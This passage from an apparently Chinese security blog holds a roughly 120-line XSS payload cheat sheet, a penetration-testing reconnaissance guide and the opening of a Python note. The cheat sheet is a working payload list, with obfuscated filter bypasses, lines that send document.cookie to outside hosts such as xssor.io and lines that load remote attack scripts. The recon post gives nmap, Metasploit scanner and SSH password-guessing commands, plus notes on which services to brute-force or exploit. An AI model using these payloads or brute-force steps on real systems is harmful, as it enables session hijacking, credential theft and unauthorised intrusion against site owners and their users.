<h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><p>伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://，而是为关联应用程序而使用的。如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript: 我们可以在浏览地址栏里输入”javascript:alert(‘JS!’);”，点转到后会发现，实际上是把javascript: 后面的代码当JavaScript来执行，并将结果值返回给当前页面。（XSS Changes Stage #8）</p>
<h4 id="XSS-常用-payload"><a href="#XSS-常用-payload" class="headerlink" title="XSS 常用 payload"></a>XSS 常用 payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">&gt;&quot;&apos;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;script&gt;alert(0);&lt;/script&gt;=&amp;&#123;()&#125;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;script&gt;alert(0);&lt;/script&gt;=&amp;&#123;(alert(1))&#125;</span><br><span class="line">`&gt;&lt;script&gt;alert(0)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=eval;b=alert;a(b(/i/.source));&lt;/script&gt;</span><br><span class="line">&lt;code onmouseover=a=eval;b=alert;a(b(/g/.source));&gt;HI&lt;/code&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=http://xssor.io/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;script&gt;location.href=&apos;http://127.0.0.1:8088/cookie.php?cookie=&apos;+escape(document.cookie);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&apos;&quot;&gt;&lt;img onerror=alert(0) src=&gt;&lt;&quot;&apos;</span><br><span class="line">&lt;img src=http://127.0.0.1/myspace.asp&gt;</span><br><span class="line">&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:al&amp;#13;ert(0)&gt;</span><br><span class="line">&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:i=&quot;x=document.createElement(&apos;script&apos;);x.src=&apos;http://xssor.io/xn.js&apos;;x.defer=true;document.getElementsByTagName(&apos;head&apos;)[0].appendChild(x)&quot;;execScript(i)&gt;</span><br><span class="line">&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:i=&quot;x=docu&amp;#13;ment.createElement(&apos;\u0053\u0043\u0052\u0049\u0050\u0054&apos;);x.src=&apos;http://xssor.io/xn.js&apos;;x.defer=true;doc&amp;#13;ument.getElementsByTagName(&apos;head&apos;)[0].appendChild(x)&quot;;execScri&amp;#13;pt(i)&gt;</span><br><span class="line">new Image().src=&quot;http://xssor.io/phishing/cookie.asp?cookie=&quot;+escape(document.cookie);</span><br><span class="line"></span><br><span class="line">&lt;iframe src=http://www.baidu.com/&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body background=javascript:alert(/xss/)&gt;&lt;/body&gt;</span><br><span class="line">body&#123;xxx:expression(eval(String.fromCharCode(105,102,40,33,119,105,110,100,111,119,46,120,41,123,97,108,101,114,116,40,39,120,115,115,39,41,59,119,105,110,100,111,119,46,120,61,49,59,125)))&#125;</span><br><span class="line">&lt;style&gt;body&#123;width:ｅxpression(parent.document.write(unescape(&apos;%3Cscript%20src%3Dhttp%3A//xssor.io/phishing/%3E%3C/script%3E&apos;)));&#125;&lt;/style&gt;</span><br><span class="line">a&#123;xxx:expression(if(!window.x)&#123;alert(&apos;xss&apos;);window.x=1;&#125;)&#125;</span><br><span class="line">a&#123;xxx:\65\78\70\72\65\73\73\69\6f\6e\28\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\27\78\73\73\27\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\3b\7d\29&#125;</span><br><span class="line">body&#123;background:url(&quot;javascript:alert(&apos;xss&apos;)&quot;)&#125;</span><br><span class="line">body&#123;background:url(JavAs	cr	</span><br><span class="line">ipt:alert(0))&#125;</span><br><span class="line">&lt;style&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;xss&quot;)&apos;;&lt;/style&gt;</span><br><span class="line">@i\6d\70o\72\74&apos;javascr\ipt:alert(document.cookie)&apos;;</span><br><span class="line">&lt;div style=xss:expres&amp;#92sion(if(!window.x)&#123;alert(&apos;xss&apos;);window.x=1;&#125;)&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">alert(String(/xss/).substr(1,3))</span><br><span class="line">alert(/xss/.source)</span><br><span class="line">&lt;a onclick=&quot;i=createElement(&apos;iframe&apos;);i.src=&apos;javascript:alert(/xss/)&apos;;x=parentNode;x.appendChild(i);&quot; href=&quot;#&quot;&gt;Test&lt;/a&gt;</span><br><span class="line">x=&apos;\x61\x6c\x65\x72\x74\x28\x31\x29&apos;;new Function(x)()</span><br><span class="line">&lt;a href=&quot;&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&quot;&gt;Test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4=&quot;&gt;Test&lt;/a&gt;</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line">&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;-moz-binding:url(http://xssor.io/0.xml#xss);x:expression((window.r!=1)?eval(&apos;x=String.fromCharCode;scr=document.createElement(x(115,99,114,105,112,116));scr.setAttribute(x(115,114,99),x(104,116,116,112,58,47,47,119,119,119,46,48,120,51,55,46,99,111,109,47,48,46,106,115));document.getElementById(x(105,110,106,101,99,116)).appendChild(scr);window.r=1;&apos;):1);&quot;id=&quot;inject&quot;&gt;</span><br><span class="line"></span><br><span class="line">javascript:document.scripts[0].src=&apos;http://127.0.0.1/yy.js&apos;;void(0);</span><br><span class="line">&lt;a href=&quot;javascript:x=open(&apos;http://www.xiaonei.com/&apos;);setInterval (function()&#123;try&#123;x.frames[0].location=&#123;toString:function()&#123;return%20&apos;http://xssor.io/Project/poc/docshell.html&apos;;&#125;&#125;&#125;catch(e)&#123;&#125;&#125;,3000);void(1);&quot;&gt;Test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;script/onreadystatechange=alert(1)&gt;</span><br><span class="line">&lt;script/src=data:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,alert(4)&gt;&lt;/script&gt;</span><br><span class="line">javascript:document.cookie=window.prompt(&quot;edit cookie:&quot;,document.cookie);void(0);</span><br><span class="line">&lt;input id=11 name=s value=`aa`onclick=alert(/xss/)&gt;</span><br><span class="line">&lt;input value:aa/onclick=alert(/xss/)&gt;</span><br><span class="line">&lt;li style=list-style:url() onerror=alert(1)&gt;</span><br><span class="line">&lt;div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)&gt;&lt;/div&gt;</span><br><span class="line">&lt;head&gt;&lt;base href=&quot;javascript://&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=&quot;/. /,alert(1)//#&quot;&gt;XXX&lt;/a&gt;&lt;/body&gt;</span><br><span class="line">&lt;OBJECT CLASSID=&quot;clsid:333C7BC4-460F-11D0-BC04-0080C7055A83&quot;&gt;&lt;PARAM NAME=&quot;DataURL&quot; VALUE=&quot;javascript:alert(1)&quot;&gt;&lt;/OBJECT&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;input value=&quot;``onmouseover=alert(1)&quot;&gt;&lt;/div&gt; &lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;&lt;script&gt;document.getElementById(&quot;div2&quot;).innerHTML = document.getElementById(&quot;div1&quot;).innerHTML;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">[!] ie only:</span><br><span class="line">&lt;div style=width:1px;filter:glow onfilterchange=alert(1)&gt;x</span><br><span class="line">&lt;title onpropertychange=alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;</span><br><span class="line">&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script --&gt; &lt;!--[if&lt;img src=x onerror=alert(1)//]&gt; --&gt;</span><br><span class="line"></span><br><span class="line">[!] parsing error:</span><br><span class="line">&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;comment&gt;&lt;img src=&quot;&lt;/comment&gt;&lt;img src=x onerror=alert(1))//&quot;&gt;</span><br><span class="line">&lt;![&gt;&lt;img src=&quot;]&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;b &lt;script&gt;alert(1)&lt;/script&gt;0</span><br><span class="line">&lt;x &apos;=&quot;foo&quot;&gt;&lt;x foo=&apos;&gt;&lt;img src=x onerror=alert(1)//&apos;&gt;</span><br><span class="line"></span><br><span class="line">[!] special tags parsing issues, from: http://html5sec.org/#html</span><br><span class="line">&lt;? foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;! foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;/ foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;? foo=&quot;&gt;&lt;x foo=&apos;?&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&quot;&gt;</span><br><span class="line">&lt;! foo=&quot;[[[Inception]]&quot;&gt;&lt;x foo=&quot;]foo&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;% foo&gt;&lt;x foo=&quot;%&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">[!] fuzzing tips: </span><br><span class="line">&lt;img[a][b][c]src[d]=x[e]onerror=[f]&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;a href=java&amp;#1&amp;#2&amp;#3&amp;#4&amp;#5&amp;#6&amp;#7&amp;#8&amp;#11&amp;#12script:alert(1)&gt;XXX&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">[!] utf-7 bom</span><br><span class="line">+/v8</span><br><span class="line">+/v9</span><br><span class="line">+/v+</span><br><span class="line">+/v/</span><br><span class="line"></span><br><span class="line">[!] html5sec.org</span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line">&lt;form id=&quot;test&quot;&gt;&lt;/form&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:alert(1)&quot;&gt;X&lt;/button&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;iframe srcdoc=&quot;&lt;svg onload=alert(1)&amp;nvgt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;frameset onload=alert(1)&gt;</span><br><span class="line">&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;title&gt;&lt;img src=&quot;&lt;/title&gt;&lt;img src=x onerror=alert(1)//&quot;&gt; // by evilcos</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;frameset onpageshow=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;body onpageshow=&quot;alert(1)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`-alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`+alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`/alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`%alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`==alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`/=alert(123)&lt;/script&gt; # Only Edge</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`*=alert(123)&lt;/script&gt; # Only Edge</span><br><span class="line"></span><br><span class="line">&lt;img/src==&quot;x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;div/style==&quot;x onclick=alert(1)//&quot;&gt;XSS&apos;OR</span><br><span class="line">&lt;div style=behavior:url(&quot; onclick=alert(1)//&quot;&gt;XSS&apos;OR</span><br><span class="line">&lt;div style=x:x(&quot; onclick=alert(1)//&quot;&gt;XSS&apos;OR</span><br><span class="line"></span><br><span class="line">&lt;div&gt; &lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;base href=&quot;javascript:\ &lt;/div&gt;&lt;div id=&quot;x&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;base href=&quot;javascript:/&quot;&gt;&lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;base href=&quot;javascript:\&quot;&gt;&lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;base/href=javascript:/&gt;&lt;a href=/*&apos;&quot;+-/%~.,()^&amp;$#@!*/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;noembed&gt;&lt;img src=&quot;&lt;/noembed&gt;&lt;iframe onload=alert(1)&gt;&quot; /&gt;&lt;/noembed&gt;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/渗透测试前期---信息搜集/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="鸡翅儿">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/渗透测试前期---信息搜集/" itemprop="url">渗透测试前期--信息搜集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Metasploit-渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">Metasploit 渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>##Web 信息搜集：</p>
<ol>
<li>Web 信息搜集（探测）即 Web 踩点，主要是掌握目标Web服务的方方面面，是实现Web渗透入侵前的准备工作</li>
<li>Web 踩点内容包括操作系统（linux、windows等）、服务器类型（服务器平台、版本等）、数据库类型（access、sqlsever、mysql、oracle、postgresql等）、Web 容器（iis、Apache、nginx、tomcat等）、脚本类型（ASP、php/jsp、aspx等）、域名信息、网站目录、CMS、WAF等</li>
<li>Web 信息搜集涉及搜索引擎、网站扫描、域名遍历、指纹识别等工作<h2 id="一-外围信息搜集"><a href="#一-外围信息搜集" class="headerlink" title="一. 外围信息搜集"></a>一. 外围信息搜集</h2></li>
</ol>
<h4 id="1-通过DNS和IP挖掘目标网络信息"><a href="#1-通过DNS和IP挖掘目标网络信息" class="headerlink" title="1. 通过DNS和IP挖掘目标网络信息"></a>1. 通过DNS和IP挖掘目标网络信息</h4><pre><code>1. whois域名注册信息查询
  msf &gt; whois testfire.net
    nslookup与dig域名查询IP2Location地理位置查询    
        dig @&lt;DNS 服务器&gt; &lt;待查询的域名&gt;
        http://www.maxmind.com
2. Google Maps
        http://www.cz88.net(国内IP查询)
3. netcraft网站提供的信息查询服务
        http://searchdns.netcraft.com/ (查询子域名)
        https://toolbar.netcraft.com/site_report
4. IP2Domain 反查域名
        http://www.webscan.cc/
</code></pre><h4 id="2-通过搜索引擎进行信息搜集"><a href="#2-通过搜索引擎进行信息搜集" class="headerlink" title="2. 通过搜索引擎进行信息搜集"></a>2. 通过搜索引擎进行信息搜集</h4><pre><code>1. Google Hacking
    可使用参数：site  filetype inurl intitle intext
    举例：
          inurl:/admin/login.php             # 搜索网址中有 &quot;/admin/login.php&quot; 的网页
          intitle:后台管理 filetypr:php       # 搜索标题是后台管理的 php 页面
          intitle:index of&quot;parent directory&quot; # 搜索根目录相关的索引目录信息
          intext:Powered by wordpress        # 搜索 wordpress 制作的博客网址
          intext:Powered by *CMS             # 搜索*CMS相关的页面
          intext:powered by xxx inurl:login  # 搜索此类网址的后台登录页面
2. 探索网站目录结构
     敏感目录收集方向：robots.txt、后台目录、安装包、上传目录、mysql管理接口、安装页面、phpinfo、编辑器、iis短文件
    Google 搜索 parent directory site:baidu.com
        1. 扩展名为inc的文件：可能会包含网站的配置信息，如数据库用户名／口令等，
        2. 扩展名为bak的文件：通常是一些文本编辑器在编辑源代码后留下的备份文件，可以让你知道与其对应的程序脚本文件中的大致内容。
        3. 扩展名为txt或sql的文件：一般包含网站运行的SQL脚本，可能会透露类似数据库结构等信息
3. 搜索网站中的E-mail地址
    msf中search_email_collector模块通过多个搜索引擎的查询结果分析使用此后缀的邮件地址从而获取某个机构的大量邮件地址
4. 搜索易存在SQL注入点的页面
    Google搜索 site:testfire.net inurl:login
5. shodan 搜索
</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/12585049-ab635edd3371c5f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h2 id="二-主机探测与端口扫描"><a href="#二-主机探测与端口扫描" class="headerlink" title="二.主机探测与端口扫描"></a>二.主机探测与端口扫描</h2><h4 id="1-活跃主机扫描"><a href="#1-活跃主机扫描" class="headerlink" title="1.活跃主机扫描"></a>1.活跃主机扫描</h4><pre><code>1. ICMP Ping 命令
2. Metasploit的主机发现模块
    常用模块
    arp_sweep 使用ARP请求枚举本地局域网中的所有活跃主机
    udp_sweep 通过发送UDP数据包探查制定主机是否活跃，并发现主机上的UDP服务
    arpping(不支持同一网段扫描)
    arping IP   
    arping IP -c 1       //一次返回一条数据
3. 使用Nmap进行主机探测(支持同一网段扫描)
    nmap -sn IP            //扫描存活主机，只做ping扫描不做端口扫描
4. arp侦查-netdiscover
    主动探测
    netdiscover -i eth0 -r 192.168.1.1/24  // -i 指定网卡 -r 指定ip范围
    被动探测
    netdiscover -p
</code></pre><h4 id="2-操作系统辨识"><a href="#2-操作系统辨识" class="headerlink" title="2. 操作系统辨识"></a>2. 操作系统辨识</h4><pre><code>Nmap 扫描 -O 参数对目标操作系统进行识别
Nmap 扫描 -sV 参数对其服务版本进行识别
</code></pre><h4 id="3-端口扫描与服务类型探测"><a href="#3-端口扫描与服务类型探测" class="headerlink" title="3. 端口扫描与服务类型探测"></a>3. 端口扫描与服务类型探测</h4><pre><code>    端口扫描工具：nmap portscan ntscan telnet
1. Metasploit 中的端口扫描器
    msf &gt; search portscan
    ack：通过ACK扫描的方式对防火墙上未被屏蔽的端口进行探测
    ftpbounce：通过 FTP bounce 攻击的原理对TCP服务进行枚举，一些新的FTP服务器软件能够很好的防范FTP bounce 攻击，但在一些旧的 Solaris及 FREEBSD系统的FTP服务中此类攻击方式仍能够b被利用
    syn：使用发送 TCP SYN 标志的方式探测开放的端口
    tcp：通过一次完整的TCP连接来判断端口是否开放，这种扫描方式最准确，但扫描速度较慢。
    xmas：一种更为隐秘的扫描方式，通过发送FIN、PSH和URG标志，能够躲避一些高级的TCP标记监测器的过滤。
2. Nmap端口扫描功能
   常见端口
    IIS（HTTP）：80
    SQLServer：1433        爆破
    Oracle：1521
    MySQL：3306        爆破
    FTP：21        匿名访问
    SSH：22        hydra爆破
    Tomcat：8080
    SSL服务：443        心脏出血漏洞 1.0.1g版本之前
    Redis：6379        未授权访问
    weblogic：7001        SSRF/反序列化漏洞、控制台部署 getshell
    zabbix控制台：8069        弱口令/注入
    elasticsearch：9200        远程代码执行漏洞
    memcacache：1121        未授权访问
    mongondb：27017        未授权访问      
    RDP远程桌面：3389        爆破  
    Weblogic默认端口:7001    
    端口类型:
        open：一个应用程序正在此端口上进行监听，以接收来自TCP、UDP或SCTP协议的数据。这是在渗透测试中最关注的一类端口，开放端口往往能够为我们提供一条能够进入系统的攻击路径.（端口开放）
        closed：关闭的端口指的是主机已响应，但没有应用程序监听的端口。这些信息并非毫无价值，扫描出关闭端口至少说明主机是活跃的。（端口关闭）
        filtered：指Nmap不能确认端口是否开放，但根据响应数据猜测该端口可能被防火墙等设备过滤
        unfiltered：仅在使用ACK扫描时，Nmap无法确定端口是否开放，会归为此类。可以使用其他类型的扫描（如Window扫描、SYN扫描、FIN扫描）进一步确认端口的信息。
       open|filtered：端口开放或屏蔽
    常用的Nmap扫描类型参数主要有：
        -p | -F ：-p 指定端口 | -F 执行快速扫描 
        -sT： TCP connect扫描，类似Metasploit中的tcp扫描模块
        -ss： TCP SYN扫描，类似 Metasploit中的syn扫描模块。
        -sF/-sX/-sN：这些扫描通过发送一些特殊的标志位以避开设备或软件的监测。
        -sP：通过发送 ICMP echo请求探测主机是否存活，原理同Ping。
        -sU：探测目标主机开放了哪些UDP端口
        -sA： TCP ACK扫描，类似 Metasploit中的ack扫描模块
</code></pre><h4 id="4-指纹识别"><a href="#4-指纹识别" class="headerlink" title="4. 指纹识别"></a>4. 指纹识别</h4><pre><code>1. whatweb 获取目标网站的系统、容器、脚本、版本信息
   whatweb -h                  # 查看参数
   whatweb url/ip              # 基础扫描
   whatweb -a 3 -v url/ip      # 详细扫描
2. 御剑指纹识别
</code></pre><h2 id="三、服务器扫描与查点"><a href="#三、服务器扫描与查点" class="headerlink" title="三、服务器扫描与查点"></a>三、服务器扫描与查点</h2><h4 id="1-常见网络服务扫描"><a href="#1-常见网络服务扫描" class="headerlink" title="1. 常见网络服务扫描"></a>1. 常见网络服务扫描</h4><pre><code>1. Telnet 服务扫描
    msf &gt; use auxiliary/scanner/telnet/telnet_version
2. SSH 服务扫描
    msf &gt; use auxiliary/scanner/ssh/ssh_version
3. Oracle 数据库服务查点
    msf &gt; use auxiliary/scanner/oracle/tnslsnr_version
4. 开放代理探测与利用
    设置代理服务器
    msf &gt; use auxiliary/scanner/http/open_proxy 
5. nmap服务器扫描
    -sV：版本探测
    -O：启用操作系统探测
    --osscan-limit：对指定的目标系统进行操作系统探测
</code></pre><h4 id="2-口令猜测与嗅探"><a href="#2-口令猜测与嗅探" class="headerlink" title="2. 口令猜测与嗅探"></a>2. 口令猜测与嗅探</h4><pre><code> 1. SSH服务口令猜测
    msf &gt; use auxiliary/scanner/ssh/ssh_login
    msf &gt; set RHOSTS x.x.x.x
    msf &gt; set USERNAME root
    msf &gt; set PASS_FILE /root/words.txt
    msf &gt; set THREADS 50
    msf &gt; run
2. psnuffle 口令嗅探
    截获常见协议的身份认证过程
    msf &gt; use auxiliary/sniffer/psnuffle
</code></pre><h2 id="后台查找"><a href="#后台查找" class="headerlink" title="后台查找"></a>后台查找</h2><pre><code>1. 弱口令默认后台：admin，admin/login.asp，manage，login.asp等常见后台
2. 查看网页的链接：一般来说，网站的主页有管理登录类似的东西，有些可能被管理员删除
3. 查看网站图片的属性
4. 查看网站使用的管理系统，从而确定后台
5. 用工具查找：www.scan，intellitamper，御剑
6. robots.txt 的帮助：robots.txt文件告诉支柱程序在服务器上什么样的文件可以被查看
7. GooglHacker
8. 查看网站使用的编辑器是否有默认后台
9. 短文件利用
10. sqlmap --sql-shell load_file(&apos;&apos;);
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Python-3-学习/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="鸡翅儿">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/Python-3-学习/" itemprop="url">Python-3-学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:30:03+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Python/" itemprop="url" rel="index">
                    <span itemprop="name">Python</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>注：制表符缩进和空格缩进不能同时使用</p>
